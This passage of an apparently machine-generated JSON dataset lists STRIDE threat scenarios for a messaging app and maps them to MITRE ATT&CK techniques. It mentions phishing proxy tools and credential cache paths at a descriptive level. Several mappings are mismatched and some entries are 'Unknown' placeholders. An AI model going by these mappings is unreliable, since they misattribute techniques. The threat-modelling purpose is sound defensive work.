                    "Condition": "Security measures have not been adequately implemented in the software development lifecycle."
                }
            ],
            "Potential Impact": "Complete control over the application and user data",
            "MITRE ATT&CK Keywords": [
                "software flaw",
                "administrative access",
                "application vulnerability",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake messaging application resembling the genuine one to intercept user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users trust app store downloads without verifying authenticity",
                    "Role": "User",
                    "Condition": "Downloading apps from unofficial sources"
                },
                {
                    "Assumption": "Attackers have the resources to develop a convincing counterfeit app",
                    "Role": "Attacker",
                    "Condition": "Sufficient technical skills and resources"
                },
                {
                    "Assumption": "App stores fail to detect and remove counterfeit apps in a timely manner",
                    "Role": "App Store Provider",
                    "Condition": "Inadequate app review processes"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of user credentials",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Phishing",
                "Credential Harvesting",
                "Impersonation"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca",
                "technique_id": "T1596.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "MFA tokens are intercepted by a malicious entity masquerading as a legitimate app during the account setup process.",
            "Assumptions": [
                {
                    "Assumption": "Users are unaware of the interception",
                    "Role": "User",
                    "Condition": "During account setup"
                },
                {
                    "Assumption": "The malicious app can convincingly present itself as legitimate",
                    "Role": "Attacker",
                    "Condition": "High skills in mimicking"
                },
                {
                    "Assumption": "Users do not cross-verify the app credentials",
                    "Role": "User",
                    "Condition": "Assuming app store authenticity"
                }
            ],
            "Potential Impact": "Compromised user accounts due to intercepted MFA tokens",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "MFA Interception",
                "Phishing",
                "Impersonation"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a doppelganger domain to intercept web communications from desktop clients to steal credentials.",
            "Assumptions": [
                {
                    "Assumption": "User inadvertently visits the doppelganger site",
                    "Role": "User",
                    "Condition": "Typing mistakes or misleading links"
                },
                {
                    "Assumption": "The doppelganger domain closely resembles the legitimate domain",
                    "Role": "Attacker",
                    "Condition": "High similarity in domain names"
                },
                {
                    "Assumption": "The attacker possesses an SSL certificate to appear legitimate",
                    "Role": "Attacker",
                    "Condition": "Ability to obtain SSL certificates"
                }
            ],
            "Potential Impact": "Unauthorized disclosure and interception of sensitive communication",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Doppelganger Domain",
                "Phishing",
                "Credential Harvesting"
            ],
            "mitre_technique": {
                "name": "Digital Certificates",
                "description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "id": "attack-pattern--0979abf9-4e26-43ec-9b6e-54efc4e70fca",
                "technique_id": "T1596.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious actor gains physical access to a user's mobile device and installs spyware to capture encrypted messages.",
            "Assumptions": [
                {
                    "Assumption": "The device is left unattended in a public space",
                    "Role": "User",
                    "Condition": "Leaving device carelessly"
                },
                {
                    "Assumption": "The attacker installs the software without detection",
                    "Role": "Attacker",
                    "Condition": "Sufficient time and knowledge"
                },
                {
                    "Assumption": "The user is not using additional security measures (e.g., screen locks)",
                    "Role": "User",
                    "Condition": "Lack of secondary security features"
                }
            ],
            "Potential Impact": "Corruption or unauthorized access to sensitive data",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Physical Access",
                "Spyware",
                "Device Compromise"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with remote access alters the encrypted databases on the desktop clients to potentially decrypt stored messages.",
            "Assumptions": [
                {
                    "Assumption": "Remote access to the desktop client is achievable",
                    "Role": "Attacker",
                    "Condition": "Exploiting vulnerabilities"
                },
                {
                    "Assumption": "Database tampering goes undetected by the user",
                    "Role": "User",
                    "Condition": "Lack of monitoring"
                },
                {
                    "Assumption": "The attacker understands the database structure and encryption",
                    "Role": "Attacker",
                    "Condition": "High technical expertise"
                }
            ],
            "Potential Impact": "Integrity compromise and potential disclosure of sensitive information",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Remote Access",
                "Database Manipulation",
                "Exploiting Vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A man-in-the-middle attack modifies messages in transit, causing users to receive altered communications.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept the communication channel",
                    "Role": "Attacker",
                    "Condition": "Network-level access"
                },
                {
                    "Assumption": "Users are unaware of the potential attack",
                    "Role": "User",
                    "Condition": "Lack of suspicious indicators"
                },
                {
                    "Assumption": "The messaging system does not have adequate tamper-detection mechanisms",
                    "Role": "Application Developer",
                    "Condition": "Insufficient protocol protections"
                }
            ],
            "Potential Impact": "Data integrity compromise and potential misinformation",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "MITM",
                "Message Alteration",
                "Interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user denies sending a fraudulent message by claiming their account was hacked.",
            "Assumptions": [
                {
                    "Assumption": "The user can convincingly claim account compromise",
                    "Role": "User",
                    "Condition": "Lack of account activity logging"
                },
                {
                    "Assumption": "There is no robust method to verify message origins",
                    "Role": "Application Developer",
                    "Condition": "Inadequate logging mechanisms"
                },
                {
                    "Assumption": "No additional verification or authentication for sent messages",
                    "Role": "Application Developer",
                    "Condition": "Lack of feature implementation"
                }
            ],
            "Potential Impact": "Disruption in trust and potential legal complications",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Message Fraud",
                "Account Compromise Claim",
                "Denial"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user falsely claims that a legitimate action was unauthorized, such as deleting important messages.",
            "Assumptions": [
                {
                    "Assumption": "Lack of audit trails for user actions",
                    "Role": "Application Developer",
                    "Condition": "No action logging implemented"
                },
                {
                    "Assumption": "User has plausible deniability due to weak security measures",
                    "Role": "User",
                    "Condition": "Ambiguous or weak authentication"
                },
                {
                    "Assumption": "There is no mechanism to validate legitimate user actions",
                    "Role": "Application Developer",
                    "Condition": "Inadequate action verification"
                }
            ],
            "Potential Impact": "Data integrity issues and accountability challenges",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "False Claims",
                "Action Denial",
                "Audit Trail Absence"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes log files to erase evidence of malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains access to log files",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation or breach"
                },
                {
                    "Assumption": "Application logs are not tamper-proof",
                    "Role": "Application Developer",
                    "Condition": "Weak log protection measures"
                },
                {
                    "Assumption": "No backup or redundant logging mechanisms in place",
                    "Role": "Application Developer",
                    "Condition": "Lack of log redundancy"
                }
            ],
            "Potential Impact": "Difficulty in forensic analysis and accountability",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "Log Deletion",
                "Malicious Activity Concealment",
                "Forensic Evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the SQLite database to access stored messages.",
            "Assumptions": [
                {
                    "Assumption": "The SQLite database has a known or zero-day vulnerability",
                    "Role": "Application Developer",
                    "Condition": "Vulnerability present in SQLite version used"
                },
                {
                    "Assumption": "The attacker can execute the exploit",
                    "Role": "Attacker",
                    "Condition": "Vulnerability exploitation access"
                },
                {
                    "Assumption": "Database encryption is weak or improperly implemented",
                    "Role": "Application Developer",
                    "Condition": "Inadequate encryption practices"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of stored sensitive messages",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Database Exploit",
                "SQLite Vulnerability",
                "Data Breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive information is leaked through unencrypted backup files on a companion device.",
            "Assumptions": [
                {
                    "Assumption": "Users perform regular backups without enabling encryption",
                    "Role": "User",
                    "Condition": "Lack of encryption awareness"
                },
                {
                    "Assumption": "Backup files are stored insecurely",
                    "Role": "User",
                    "Condition": "Weak storage security"
                },
                {
                    "Assumption": "Attackers can access the backup files",
                    "Role": "Attacker",
                    "Condition": "Obtaining storage access"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive backup data",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Backup Files",
                "Unencrypted Data",
                "Leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Logs containing sensitive information are stored insecurely and accessed by unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Logs contain sensitive information",
                    "Role": "Application Developer",
                    "Condition": "Detailed logging practices"
                },
                {
                    "Assumption": "Log storage is not adequately secured",
                    "Role": "User",
                    "Condition": "Weak local storage protection"
                },
                {
                    "Assumption": "Attackers can gain access to the log storage",
                    "Role": "Attacker",
                    "Condition": "Successful breach of storage protections"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information through log files",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Insecure Logs",
                "Sensitive Data",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Kerberos Tickets",
                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
                "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
                "technique_id": "T1558"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A DDoS attack targets the application servers, preventing users from sending or receiving messages.",
            "Assumptions": [
                {
                    "Assumption": "The application servers are reachable from the internet",
                    "Role": "Application Developer",
                    "Condition": "Exposed server endpoints"
                },
                {
                    "Assumption": "The attacker can marshal sufficient resources for a DDoS attack",
                    "Role": "Attacker",
                    "Condition": "Availability of botnet resources"
                },
                {
                    "Assumption": "The application lacks robust DDoS protection measures",
                    "Role": "Application Developer",
                    "Condition": "Insufficient DDoS mitigation"
                }
            ],
            "Potential Impact": "Service unavailability and communication disruption",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Server Targeting",
                "Communication Disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a software vulnerability to crash the messaging application's companion devices.",
            "Assumptions": [
                {
                    "Assumption": "The companion device software has a vulnerability",
                    "Role": "Application Developer",
                    "Condition": "Presence of exploitable bug or flaw"
                },
                {
                    "Assumption": "The attacker can trigger the vulnerability",
                    "Role": "Attacker",
                    "Condition": "Knowledge of and access to exploit conditions"
                },
                {
                    "Assumption": "The application's error-handling mechanisms cannot mitigate the crash",
                    "Role": "Application Developer",
                    "Condition": "Insufficient error handling"
                }
            ],
            "Potential Impact": "Disruption of desktop client availability and user communication",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Software Vulnerability",
                "Crash",
                "Companion Device"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding the encrypted communication channels with illegitimate messages to overwhelm the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send multiple illegitimate messages",
                    "Role": "Attacker",
                    "Condition": "Access to communication protocol"
                },
                {
                    "Assumption": "The system lacks efficient message rate-limiting or filtering",
                    "Role": "Application Developer",
                    "Condition": "Weak rate limiting implementations"
                },
                {
                    "Assumption": "The system does not detect and filter spam effectively",
                    "Role": "Application Developer",
                    "Condition": "Inadequate spam detection"
                }
            ],
            "Potential Impact": "System slowdown or service disruption",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Message Flooding",
                "Communication Overload",
                "Spam"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting a vulnerability to gain administrative access to the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The primary device has a known or zero-day vulnerability",
                    "Role": "Application Developer",
                    "Condition": "Vulnerability present"
                },
                {
                    "Assumption": "The attacker can execute the exploit",
                    "Role": "Attacker",
                    "Condition": "Technical skills and access"
                },
                {
                    "Assumption": "There is no secondary verification for administrative actions",
                    "Role": "Application Developer",
                    "Condition": "Weak verification mechanisms"
                }
            ],
            "Potential Impact": "Complete compromise of the primary device and user data",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Administrative Access",
                "Exploit",
                "Primary Device"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
